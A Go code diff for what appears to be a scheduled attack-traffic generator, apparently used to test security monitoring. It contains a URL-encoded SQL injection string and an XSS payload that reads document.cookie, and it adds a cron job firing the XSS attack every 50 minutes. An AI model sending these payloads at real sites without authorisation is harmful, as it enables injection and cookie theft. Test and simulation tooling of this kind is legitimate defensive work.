@@ -120,7 +120,7 @@ func (p *program) Start(s service.Service) error {
 	searchApi = Attack{name: "Search API", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 800, url: fmt.Sprintf("http://%s/api/search", target)}
 	sqlBlast = Attack{name: "SQL Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
-		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
+		minRequests: 100, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0, pause: 3,
@@ -189,6 +189,7 @@ func (p *program) run() {
 	
 	/* Every 50th minute */
 	c.AddFunc("0 */50 * * *", func() { ratelimit.send() })
+	c.AddFunc("0 */50 * * *", func() { xssBlast.send() })
 
 	/* At minute 50 */
 	c.AddFunc("0 50 * * * *", func() { sqlBlast.send() })
